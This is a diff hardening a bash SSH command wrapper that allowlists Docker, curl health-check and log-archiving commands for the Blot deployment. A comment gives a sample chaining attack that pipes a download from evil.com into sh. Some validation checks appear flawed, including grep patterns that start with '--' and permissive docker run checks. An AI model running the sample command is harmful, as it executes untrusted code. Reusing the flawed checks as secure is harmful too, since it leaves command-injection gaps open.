@@ -104,175 +104,293 @@ if [ -z "${ORIGINAL_CMD}" ]; then
     exit 1
 fi
 
-# Allowed command patterns
-# We use pattern matching to allow specific commands while preventing shell access
-# Commands with pipes, &&, || will still match if they start with an allowed pattern
-# The full ORIGINAL_CMD (including pipes and operators) is executed
+# Security: Reject commands with dangerous shell operators
+# This prevents command chaining attacks like: docker pull image; curl evil.com | sh
+if echo "${ORIGINAL_CMD}" | grep -qE '[;&|`$<>]|&&|\|\|'; then
+    # Exception: Allow specific safe patterns used in deployment
+    # 1. docker inspect with pipes to sed (for extracting image hash)
+    # 2. docker logs with redirects (for log archiving)
+    # 3. mkdir/cd/ls/tail/xargs/rm chains (for log cleanup)
+    # 4. || true patterns (for error handling)
+    # 5. 2>/dev/null redirects (for suppressing errors)
+    
+    # Check if it's one of our allowed patterns
+    ALLOWED_PATTERN=false
+    
+    # Pattern 1: docker inspect with sed pipe (for rollback hash extraction)
+    # Format: docker inspect --format='{{.Config.Image}}' container 2>/dev/null | sed 's/.*://' || echo ''
+    if echo "${ORIGINAL_CMD}" | grep -qE "^docker inspect --format='\{\{.Config.Image\}\}' blot-container-(blue|green|yellow) 2>/dev/null \| sed 's/.*://' \|\| echo ''$"; then
+        ALLOWED_PATTERN=true
+    fi
+    
+    # Pattern 2: docker inspect with echo fallback (for health checks)
+    # Format: docker inspect --format='{{.State.Health.Status}}' container 2>/dev/null || echo 'starting'
+    if echo "${ORIGINAL_CMD}" | grep -qE "^docker inspect --format='\{\{.State.Health.Status\}\}' blot-container-(blue|green|yellow) 2>/dev/null \|\| echo 'starting'$"; then
+        ALLOWED_PATTERN=true
+    fi
+    
+    # Pattern 3: Log archiving chain (mkdir && docker logs > file && cd && ls | tail | xargs rm)
+    # Format: mkdir -p /tmp/blot-deploy-logs/container && (docker logs container > file.log 2>&1 || true) && cd dir && ls -1t | tail -n +N | xargs -r rm -f || true
+    # Timestamp format: YYYY-MM-DDTHH-MM-SS.mmmZ (e.g., 2025-01-20T14-26-10.078Z)
+    if echo "${ORIGINAL_CMD}" | grep -qE "^mkdir -p /tmp/blot-deploy-logs/blot-container-(blue|green|yellow) && \(docker logs blot-container-(blue|green|yellow) > /tmp/blot-deploy-logs/blot-container-(blue|green|yellow)/blot-container-(blue|green|yellow)-deploy-[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}-[0-9]{2}-[0-9]{2}\.[0-9]{1,3}Z\.log 2>&1 \|\| true\) && cd /tmp/blot-deploy-logs/blot-container-(blue|green|yellow) && ls -1t \| tail -n \+[0-9]+ \| xargs -r rm -f \|\| true$"; then
+        ALLOWED_PATTERN=true
+    fi
+    
+    # Pattern 4: docker rm with || true
+    if echo "${ORIGINAL_CMD}" | grep -qE "^docker rm -f blot-container-(blue|green|yellow) \|\| true$"; then
+        ALLOWED_PATTERN=true
+    fi
+    
+    # Pattern 5: curl with redirects (health checks)
+    # Format: curl --fail --max-time N http://localhost:PORT/health >/dev/null 2>&1
+    if echo "${ORIGINAL_CMD}" | grep -qE "^curl --fail --max-time [0-9]+ http://localhost:(8088|8089|8090)/health >/dev/null 2>&1$"; then
+        ALLOWED_PATTERN=true
+    fi
+    
+    if [ "${ALLOWED_PATTERN}" != "true" ]; then
+        echo "Error: Command contains dangerous shell operators: ${ORIGINAL_CMD}"
+        echo "[${TIMESTAMP}] BLOCKED (shell operators): ${ORIGINAL_CMD}" >> "${LOG_FILE}"
+        exit 1
+    fi
+fi
 
-case "${ORIGINAL_CMD}" in
-    # Docker commands - deployment related
-    "docker pull "*)
-        exec ${ORIGINAL_CMD}
+# Parse command into array for safer execution
+# This prevents shell interpretation of arguments
+IFS=' ' read -r -a CMD_ARGS <<< "${ORIGINAL_CMD}"
+
+# Validate command based on first argument
+case "${CMD_ARGS[0]:-}" in
+    "docker")
+        case "${CMD_ARGS[1]:-}" in
+            "pull")
+                # docker pull - must be followed by ghcr.io/davidmerfield/blot:hash
+                if [ "${#CMD_ARGS[@]}" -ne 3 ]; then
+                    echo "Error: docker pull requires exactly one image argument"
+                    exit 1
+                fi
+                if [[ ! "${CMD_ARGS[2]}" =~ ^ghcr\.io/davidmerfield/blot:[0-9a-f]{40}$ ]]; then
+                    echo "Error: docker pull only allowed for Blot images with commit SHA"
+                    exit 1
+                fi
+                # Safe to execute - reconstruct command from validated args
+                exec docker pull "${CMD_ARGS[2]}"
+                ;;
+            
+            "run")
+                # docker run - validate all required flags
+                # Must include: -d, --restart unless-stopped, --name, --platform, etc.
+                DOCKER_RUN_CMD="${ORIGINAL_CMD}"
+                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "docker run -d"; then
+                    echo "Error: docker run must include -d flag"
+                    exit 1
+                fi
+                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "--restart unless-stopped"; then
+                    echo "Error: docker run must include --restart unless-stopped"
+                    exit 1
+                fi
+                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "--name blot-container-(blue|green|yellow)"; then
+                    echo "Error: docker run must be for blot-container-(blue|green|yellow)"
+                    exit 1
+                fi
+                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "--platform linux/(amd64|arm64)"; then
+                    echo "Error: docker run must specify --platform linux/(amd64|arm64)"
+                    exit 1
+                fi
+                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "ghcr\.io/davidmerfield/blot:[0-9a-f]{40}$"; then
+                    echo "Error: docker run must use Blot image with commit SHA"
+                    exit 1
+                fi
+                # Additional validations for required flags
+                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "--log-driver json-file"; then
+                    echo "Error: docker run must include --log-driver json-file"
+                    exit 1
+                fi
+                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "-v /var/www/blot/data:/usr/src/app/data"; then
+                    echo "Error: docker run must include volume mount"
+                    exit 1
+                fi
+                exec ${ORIGINAL_CMD}
+                ;;
+            
+            "rm")
+                # docker rm -f container || true (already validated above if contains ||)
+                if [ "${#CMD_ARGS[@]}" -lt 3 ]; then
+                    echo "Error: docker rm requires container name"
+                    exit 1
+                fi
+                if [[ ! "${CMD_ARGS[2]}" =~ ^blot-container-(blue|green|yellow)$ ]]; then
+                    echo "Error: docker rm only allowed for blot containers"
+                    exit 1
+                fi
+                # Handle || true suffix
+                if echo "${ORIGINAL_CMD}" | grep -q " || true$"; then
+                    exec docker rm -f "${CMD_ARGS[2]}" || true
+                else
+                    exec docker rm -f "${CMD_ARGS[2]}"
+                fi
+                ;;
+            
+            "inspect")
+                # docker inspect with format and container name
+                # Allow: docker inspect --format='...' container [2>/dev/null] [|| echo ...]
+                if [ "${#CMD_ARGS[@]}" -lt 4 ]; then
+                    echo "Error: docker inspect requires format and target"
+                    exit 1
+                fi
+                if [[ ! "${CMD_ARGS[3]}" =~ ^(blot-container-(blue|green|yellow)|ghcr\.io/davidmerfield/blot:[0-9a-f]{40})$ ]]; then
+                    echo "Error: docker inspect only allowed for blot containers/images"
+                    exit 1
+                fi
+                # For commands with pipes/redirects, validate the full pattern
+                if echo "${ORIGINAL_CMD}" | grep -qE "2>/dev/null.*sed.*\|\|.*echo"; then
+                    # This is the rollback hash extraction pattern - already validated above
+                    exec ${ORIGINAL_CMD}
+                elif echo "${ORIGINAL_CMD}" | grep -qE "2>/dev/null.*\|\|.*echo.*starting"; then
+                    # This is the health check pattern - already validated above
+                    exec ${ORIGINAL_CMD}
+                elif echo "${ORIGINAL_CMD}" | grep -qE "^docker inspect --format="; then
+                    # Simple inspect without pipes
+                    exec ${ORIGINAL_CMD}
+                else
+                    echo "Error: docker inspect command format not allowed"
+                    exit 1
+                fi
+                ;;
+            
+            "ps")
+                # docker ps variations
+                if echo "${ORIGINAL_CMD}" | grep -qE "^docker ps( -a)?( --format| --filter)?"; then
+                    exec ${ORIGINAL_CMD}
+                else
+                    echo "Error: docker ps command not allowed"
+                    exit 1
+                fi
+                ;;
+            
+            "image")
+                # docker image prune -af
+                if [ "${#CMD_ARGS[@]}" -eq 4 ] && [ "${CMD_ARGS[2]}" = "prune" ] && [ "${CMD_ARGS[3]}" = "-af" ]; then
+                    exec docker image prune -af
+                else
+                    echo "Error: docker image prune only allowed with -af flag"
+                    exit 1
+                fi
+                ;;
+            
+            "info")
+                # docker info --format '{{.Architecture}}'
+                if echo "${ORIGINAL_CMD}" | grep -qE "^docker info --format '"; then
+                    exec ${ORIGINAL_CMD}
+                else
+                    echo "Error: docker info only allowed with --format"
+                    exit 1
+                fi
+                ;;
+            
+            "manifest")
+                # docker manifest inspect image
+                if [ "${#CMD_ARGS[@]}" -ne 4 ] || [ "${CMD_ARGS[2]}" != "inspect" ]; then
+                    echo "Error: docker manifest inspect requires image argument"
+                    exit 1
+                fi
+                if [[ ! "${CMD_ARGS[3]}" =~ ^ghcr\.io/davidmerfield/blot:[0-9a-f]{40}$ ]]; then
+                    echo "Error: docker manifest inspect only allowed for Blot images with commit SHA"
+                    exit 1
+                fi
+                exec docker manifest inspect "${CMD_ARGS[3]}"
+                ;;
+            
+            "logs")
+                # docker logs --tail N container
+                if [ "${#CMD_ARGS[@]}" -lt 3 ]; then
+                    echo "Error: docker logs requires container name"
+                    exit 1
+                fi
+                # Get the last argument (container name) - could be at different positions
+                CONTAINER_NAME=""
+                if [ "${#CMD_ARGS[@]}" -eq 4 ] && [ "${CMD_ARGS[2]}" = "--tail" ] && [[ "${CMD_ARGS[3]}" =~ ^[0-9]+$ ]]; then
+                    # Format: docker logs --tail N container (but container is missing in this case)
+                    echo "Error: docker logs --tail requires container name"
+                    exit 1
+                elif [ "${#CMD_ARGS[@]}" -eq 5 ] && [ "${CMD_ARGS[2]}" = "--tail" ] && [[ "${CMD_ARGS[3]}" =~ ^[0-9]+$ ]]; then
+                    # Format: docker logs --tail N container
+                    CONTAINER_NAME="${CMD_ARGS[4]}"
+                elif [ "${#CMD_ARGS[@]}" -eq 3 ]; then
+                    # Format: docker logs container (for log archiving with redirects - already validated above)
+                    CONTAINER_NAME="${CMD_ARGS[2]}"
+                else
+                    echo "Error: docker logs command format not allowed"
+                    exit 1
+                fi
+                if [[ ! "${CONTAINER_NAME}" =~ ^blot-container-(blue|green|yellow)$ ]]; then
+                    echo "Error: docker logs only allowed for blot containers"
+                    exit 1
+                fi
+                # If it has redirects, it's part of log archiving chain (already validated above)
+                if echo "${ORIGINAL_CMD}" | grep -qE "2>&1"; then
+                    exec ${ORIGINAL_CMD}
+                elif [ "${#CMD_ARGS[@]}" -eq 5 ]; then
+                    exec docker logs --tail "${CMD_ARGS[3]}" "${CMD_ARGS[4]}"
+                else
+                    exec docker logs "${CMD_ARGS[2]}"
+                fi
+                ;;
+            
+            *)
+                echo "Error: docker subcommand not allowed: ${CMD_ARGS[1]:-}"
+                exit 1
+                ;;
+        esac
         ;;
-    "docker run "*)
-        # Only allow docker run commands that match our deployment pattern
-        if echo "${ORIGINAL_CMD}" | grep -qE "(blot-container-(blue|green|yellow)|--restart unless-stopped|--platform linux/(amd64|arm64))"; then
-            exec ${ORIGINAL_CMD}
-        else
-            echo "Error: docker run command not allowed (must be for blot containers)"
-            exit 1
-        fi
-        ;;
-    "docker rm "*)
-        # Only allow removing blot containers
-        if echo "${ORIGINAL_CMD}" | grep -qE "blot-container-(blue|green|yellow)"; then
-            exec ${ORIGINAL_CMD}
-        else
-            echo "Error: docker rm command not allowed (must be for blot containers)"
-            exit 1
-        fi
-        ;;
-    "docker inspect "*)
-        # Only allow inspecting blot containers or images
-        if echo "${ORIGINAL_CMD}" | grep -qE "(blot-container-(blue|green|yellow)|ghcr.io/davidmerfield/blot)"; then
-            exec ${ORIGINAL_CMD}
-        else
-            echo "Error: docker inspect command not allowed"
-            exit 1
-        fi
-        ;;
-    "docker ps "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "docker ps -a "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "docker ps --format "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "docker ps -a --format "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "docker image prune "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "docker image prune -af")
-        exec ${ORIGINAL_CMD}
-        ;;
-    "docker info "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "docker manifest inspect "*)
-        # Only allow inspecting our registry images
-        if echo "${ORIGINAL_CMD}" | grep -qE "ghcr.io/davidmerfield/blot"; then
-            exec ${ORIGINAL_CMD}
-        else
-            echo "Error: docker manifest inspect only allowed for blot images"
-            exit 1
-        fi
-        ;;
-    "docker logs "*)
-        # Only allow viewing logs of blot containers
-        if echo "${ORIGINAL_CMD}" | grep -qE "blot-container-(blue|green|yellow)"; then
-            exec ${ORIGINAL_CMD}
-        else
-            echo "Error: docker logs only allowed for blot containers"
-            exit 1
-        fi
-        ;;
-    # Health check commands
-    "curl "*)
-        # Only allow curl to localhost for health checks
-        if echo "${ORIGINAL_CMD}" | grep -qE "curl.*localhost:(8088|8089|8090)/health"; then
+    
+    "curl")
+        # curl --fail --max-time N http://localhost:PORT/health >/dev/null 2>&1
+        # Already validated above if it contains redirects
+        if echo "${ORIGINAL_CMD}" | grep -qE "^curl --fail --max-time [0-9]+ http://localhost:(8088|8089|8090)/health"; then
             exec ${ORIGINAL_CMD}
         else
             echo "Error: curl only allowed for health checks on localhost"
             exit 1
         fi
         ;;
-    # File system commands - limited to deployment operations
-    "test "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "mkdir "*)
-        # Only allow creating directories in /tmp or /var/www/blot/data
-        if echo "${ORIGINAL_CMD}" | grep -qE "(mkdir -p.*(/tmp|/var/www/blot/data))"; then
+    
+    "mkdir")
+        # mkdir -p /tmp/blot-deploy-logs/container (part of log archiving chain)
+        # Only allow as part of validated chain above
+        if echo "${ORIGINAL_CMD}" | grep -qE "^mkdir -p /tmp/blot-deploy-logs/blot-container-(blue|green|yellow)"; then
+            # This should only be executed as part of the full log archiving chain
+            # If it's standalone, it's suspicious
+            if ! echo "${ORIGINAL_CMD}" | grep -q "&&"; then
+                echo "Error: mkdir must be part of log archiving chain"
+                exit 1
+            fi
             exec ${ORIGINAL_CMD}
         else
-            echo "Error: mkdir only allowed in /tmp or /var/www/blot/data"
+            echo "Error: mkdir only allowed for log directories"
             exit 1
         fi
         ;;
-    "ls "*)
-        # Allow ls commands (used in various contexts with pipes)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "rm "*)
-        # Only allow removing files in /tmp or log directories
-        if echo "${ORIGINAL_CMD}" | grep -qE "(rm.*(/tmp|/var/log/deploy))"; then
-            exec ${ORIGINAL_CMD}
+    
+    "echo")
+        # echo 'SSH connection successful' or echo 'starting' (fallback in health check)
+        if [ "${#CMD_ARGS[@]}" -eq 2 ] && [[ "${CMD_ARGS[1]}" =~ ^('SSH connection successful'|'starting'|'')$ ]]; then
+            exec echo "${CMD_ARGS[1]}"
         else
-            echo "Error: rm only allowed in /tmp or /var/log/deploy"
+            echo "Error: echo only allowed for specific messages"
             exit 1
         fi
         ;;
-    "mv "*)
-        # Only allow moving files in /tmp (for log archiving)
-        if echo "${ORIGINAL_CMD}" | grep -qE "(mv.*/tmp)"; then
-            exec ${ORIGINAL_CMD}
-        else
-            echo "Error: mv only allowed in /tmp"
-            exit 1
-        fi
-        ;;
-    "cd "*)
-        # Allow cd commands (used with command chaining like cd ... && ls)
-        # The directory is validated by the subsequent commands
-        exec ${ORIGINAL_CMD}
-        ;;
-    "env "*)
-        # Allow checking environment variables
-        exec ${ORIGINAL_CMD}
-        ;;
-    "grep "*)
-        # Allow grep in safe contexts
-        exec ${ORIGINAL_CMD}
-        ;;
-    "head "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "tail "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "cut "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "sed "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "awk "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "xargs "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "date "*)
-        exec ${ORIGINAL_CMD}
-        ;;
-    "("*)
-        # Allow commands wrapped in parentheses (e.g., (docker logs ... || true))
-        # This is used for log archiving operations
-        if echo "${ORIGINAL_CMD}" | grep -qE "\(docker logs.*blot-container-(blue|green|yellow)"; then
-            exec ${ORIGINAL_CMD}
-        else
-            echo "Error: Parenthesized commands only allowed for container log operations"
-            exit 1
-        fi
-        ;;
+    
     *)
-        echo "Error: Command not allowed: ${ORIGINAL_CMD}"
-        echo "[${TIMESTAMP}] BLOCKED: ${ORIGINAL_CMD}" >> "${LOG_FILE}"
-        exit 1
+        # Check if it's the log archiving chain (starts with mkdir)
+        if echo "${ORIGINAL_CMD}" | grep -qE "^mkdir -p /tmp/blot-deploy-logs/blot-container-(blue|green|yellow) &&"; then
+            # Full validation already done above
+            exec ${ORIGINAL_CMD}
+        else
+            echo "Error: Command not allowed: ${ORIGINAL_CMD}"
+            echo "[${TIMESTAMP}] BLOCKED: ${ORIGINAL_CMD}" >> "${LOG_FILE}"
+            exit 1
+        fi
         ;;
 esac
 WRAPPER_EOF
